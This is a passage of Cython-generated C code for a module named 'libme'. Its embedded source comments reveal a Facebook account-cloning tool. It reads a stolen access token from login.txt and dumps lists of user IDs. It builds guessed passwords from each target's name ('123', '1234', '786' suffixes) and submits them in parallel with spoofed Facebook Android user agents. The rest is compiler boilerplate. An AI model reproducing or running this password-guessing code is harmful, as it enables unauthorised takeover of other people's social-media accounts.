 * 			myfile = '/storage/emulated/0/f2.txt'
 */
  __pyx_tuple__100 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_myfile, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__100)) __PYX_ERR(0, 501, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__100);
  __Pyx_GIVEREF(__pyx_tuple__100);
  __pyx_codeobj__101 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__100, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_Frr, 501, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__101)) __PYX_ERR(0, 501, __pyx_L1_error)

  /* "libme.pyx":537
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __menn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 */
  __pyx_tuple__102 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_pastefile, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__102)) __PYX_ERR(0, 537, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__102);
  __Pyx_GIVEREF(__pyx_tuple__102);
  __pyx_codeobj__103 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__102, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_menn, 537, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__103)) __PYX_ERR(0, 537, __pyx_L1_error)

  /* "libme.pyx":574
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __bapi__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_tuple__104 = PyTuple_Pack(8, __pyx_n_s_self, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_ua, __pyx_n_s_pw, __pyx_n_s_ses, __pyx_n_s_headers, __pyx_n_s_response); if (unlikely(!__pyx_tuple__104)) __PYX_ERR(0, 574, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__104);
  __Pyx_GIVEREF(__pyx_tuple__104);
  __pyx_codeobj__105 = (PyObject*)__Pyx_PyCode_New(3, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__104, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_bapi, 574, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__105)) __PYX_ERR(0, 574, __pyx_L1_error)

  /* "libme.pyx":618
 * 
 * 		self.loop += 1
 * 	def __method__1__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 */
  __pyx_tuple__106 = PyTuple_Pack(2, __pyx_n_s_self, __pyx_n_s_method__1); if (unlikely(!__pyx_tuple__106)) __PYX_ERR(0, 618, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__106);
  __Pyx_GIVEREF(__pyx_tuple__106);
  __pyx_codeobj__107 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__106, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_method__1, 618, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__107)) __PYX_ERR(0, 618, __pyx_L1_error)

  /* "libme.pyx":633
 * 		elif __method__1__ == "3":
 * 			self.__mennn__()
 * 	def __10007__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */
  __pyx_tuple__108 = PyTuple_Pack(12, __pyx_n_s_self, __pyx_n_s_token, __pyx_n_s_total, __pyx_n_s_file_2, __pyx_n_s_zx, __pyx_n_s_ids, __pyx_n_s_rex, __pyx_n_s_ex, __pyx_n_s_file_3, __pyx_n_s_id, __pyx_n_s_a, __pyx_n_s_id_2); if (unlikely(!__pyx_tuple__108)) __PYX_ERR(0, 633, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__108);
  __Pyx_GIVEREF(__pyx_tuple__108);
  __pyx_codeobj__109 = (PyObject*)__Pyx_PyCode_New(1, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__108, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_10007, 633, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__109)) __PYX_ERR(0, 633, __pyx_L1_error)

  /* "libme.pyx":662
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 * 	def __10000__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/100.txt'
 */
  __pyx_tuple__110 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_file_3, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__110)) __PYX_ERR(0, 662, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__110);
  __Pyx_GIVEREF(__pyx_tuple__110);
  __pyx_codeobj__111 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__110, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_10000_2, 662, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__111)) __PYX_ERR(0, 662, __pyx_L1_error)

  /* "libme.pyx":699
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __ma__sal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */
  __pyx_tuple__113 = PyTuple_Pack(12, __pyx_n_s_self, __pyx_n_s_token, __pyx_n_s_total, __pyx_n_s__112, __pyx_n_s_zx, __pyx_n_s_ids, __pyx_n_s_rex, __pyx_n_s_ex, __pyx_n_s_file_3, __pyx_n_s_id, __pyx_n_s_a, __pyx_n_s_id_2); if (unlikely(!__pyx_tuple__113)) __PYX_ERR(0, 699, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__113);
  __Pyx_GIVEREF(__pyx_tuple__113);
  __pyx_codeobj__114 = (PyObject*)__Pyx_PyCode_New(1, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__113, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_ma__sal2, 699, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__114)) __PYX_ERR(0, 699, __pyx_L1_error)

  /* "libme.pyx":727
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Frrr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f_2.txt'
 */
  __pyx_tuple__115 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_myfile, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__115)) __PYX_ERR(0, 727, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__115);
  __Pyx_GIVEREF(__pyx_tuple__115);
  __pyx_codeobj__116 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__115, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_Frrr, 727, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__116)) __PYX_ERR(0, 727, __pyx_L1_error)

  /* "libme.pyx":763
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __mennn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 */
  __pyx_tuple__117 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_pastefile, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__117)) __PYX_ERR(0, 763, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__117);
  __Pyx_GIVEREF(__pyx_tuple__117);
  __pyx_codeobj__118 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__117, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_mennn, 763, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__118)) __PYX_ERR(0, 763, __pyx_L1_error)

  /* "libme.pyx":799
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __file__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_tuple__119 = PyTuple_Pack(16, __pyx_n_s_self, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_ua, __pyx_n_s_host, __pyx_n_s_pw, __pyx_n_s_kwargs, __pyx_n_s_ses, __pyx_n_s_p, __pyx_n_s_b, __pyx_n_s_bl, __pyx_n_s_i, __pyx_n_s_gaaa, __pyx_n_s_kuki, __pyx_n_s_key, __pyx_n_s_value); if (unlikely(!__pyx_tuple__119)) __PYX_ERR(0, 799, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__119);
  __Pyx_GIVEREF(__pyx_tuple__119);
  __pyx_codeobj__120 = (PyObject*)__Pyx_PyCode_New(3, 0, 16, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__119, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_file, 799, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__120)) __PYX_ERR(0, 799, __pyx_L1_error)

  /* "libme.pyx":846
 * 
 * 		self.loop+=1
 * 	def __33__3__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 */
  __pyx_tuple__121 = PyTuple_Pack(2, __pyx_n_s_self, __pyx_n_s_33__33); if (unlikely(!__pyx_tuple__121)) __PYX_ERR(0, 846, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__121);
  __Pyx_GIVEREF(__pyx_tuple__121);
  __pyx_codeobj__122 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__121, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_33__3, 846, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__122)) __PYX_ERR(0, 846, __pyx_L1_error)

  /* "libme.pyx":861
 * 		elif __33__33__ == "3":
 * 			self.__me__nnn__()
 * 	def __100__07__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */
  __pyx_tuple__123 = PyTuple_Pack(12, __pyx_n_s_self, __pyx_n_s_token, __pyx_n_s_total, __pyx_n_s_file_4, __pyx_n_s_zx, __pyx_n_s_ids, __pyx_n_s_rex, __pyx_n_s_ex, __pyx_n_s_file_3, __pyx_n_s_id, __pyx_n_s_a, __pyx_n_s_id_2); if (unlikely(!__pyx_tuple__123)) __PYX_ERR(0, 861, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__123);
  __Pyx_GIVEREF(__pyx_tuple__123);
  __pyx_codeobj__124 = (PyObject*)__Pyx_PyCode_New(1, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__123, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_100__07, 861, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__124)) __PYX_ERR(0, 861, __pyx_L1_error)

  /* "libme.pyx":890
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files saved in > %s"%(___file))
 * 	def __100__00__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/10_0.txt'
 */
  __pyx_tuple__125 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_file_3, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__125)) __PYX_ERR(0, 890, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__125);
  __Pyx_GIVEREF(__pyx_tuple__125);
  __pyx_codeobj__126 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__125, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_100__00, 890, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__126)) __PYX_ERR(0, 890, __pyx_L1_error)

  /* "libme.pyx":926
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __ma___sal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */
  __pyx_tuple__127 = PyTuple_Pack(12, __pyx_n_s_self, __pyx_n_s_token, __pyx_n_s_total, __pyx_n_s__112, __pyx_n_s_zx, __pyx_n_s_ids, __pyx_n_s_rex, __pyx_n_s_ex, __pyx_n_s_file_3, __pyx_n_s_id, __pyx_n_s_a, __pyx_n_s_id_2); if (unlikely(!__pyx_tuple__127)) __PYX_ERR(0, 926, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__127);
  __Pyx_GIVEREF(__pyx_tuple__127);
  __pyx_codeobj__128 = (PyObject*)__Pyx_PyCode_New(1, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__127, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_ma___sal2, 926, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__128)) __PYX_ERR(0, 926, __pyx_L1_error)

  /* "libme.pyx":954
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Fr__rr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 */
  __pyx_tuple__129 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_myfile, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__129)) __PYX_ERR(0, 954, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__129);
  __Pyx_GIVEREF(__pyx_tuple__129);
  __pyx_codeobj__130 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__129, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_Fr__rr, 954, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__130)) __PYX_ERR(0, 954, __pyx_L1_error)

  /* "libme.pyx":990
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __me__nnn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 */
  __pyx_tuple__131 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_pastefile, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__131)) __PYX_ERR(0, 990, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__131);
  __Pyx_GIVEREF(__pyx_tuple__131);
  __pyx_codeobj__132 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__131, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_me__nnn, 990, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__132)) __PYX_ERR(0, 990, __pyx_L1_error)

  /* "libme.pyx":1027
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __f_james__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_tuple__133 = PyTuple_Pack(16, __pyx_n_s_self, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_ua, __pyx_n_s_host, __pyx_n_s_pw, __pyx_n_s_kwargs, __pyx_n_s_ses, __pyx_n_s_p, __pyx_n_s_b, __pyx_n_s_bl, __pyx_n_s_i, __pyx_n_s_gaaa, __pyx_n_s_kuki, __pyx_n_s_key, __pyx_n_s_value); if (unlikely(!__pyx_tuple__133)) __PYX_ERR(0, 1027, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__133);
  __Pyx_GIVEREF(__pyx_tuple__133);
  __pyx_codeobj__134 = (PyObject*)__Pyx_PyCode_New(3, 0, 16, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__133, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_f_james, 1027, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__134)) __PYX_ERR(0, 1027, __pyx_L1_error)

  /* "libme.pyx":1073
 * 				continue
 * 		self.loop+=1
 * 	def main_coeg():             # <<<<<<<<<<<<<<
 * 		os.system("git pull")
 * 		os.system("touch login.txt")
 */
  __pyx_codeobj__135 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_main_coeg, 1073, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__135)) __PYX_ERR(0, 1073, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  __pyx_umethod_PyDict_Type_update.type = (PyObject*)&PyDict_Type;
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  __pyx_float_20000000_0 = PyFloat_FromDouble(20000000.0); if (unlikely(!__pyx_float_20000000_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_float_30000000_0 = PyFloat_FromDouble(30000000.0); if (unlikely(!__pyx_float_30000000_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_6 = PyInt_FromLong(6); if (unlikely(!__pyx_int_6)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_10 = PyInt_FromLong(10); if (unlikely(!__pyx_int_10)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_12 = PyInt_FromLong(12); if (unlikely(!__pyx_int_12)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_15 = PyInt_FromLong(15); if (unlikely(!__pyx_int_15)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_30 = PyInt_FromLong(30); if (unlikely(!__pyx_int_30)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_20000 = PyInt_FromLong(20000L); if (unlikely(!__pyx_int_20000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_40000 = PyInt_FromLong(40000L); if (unlikely(!__pyx_int_40000)) __PYX_ERR(0, 1, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initlibme(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initlibme(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_libme(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_libme(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


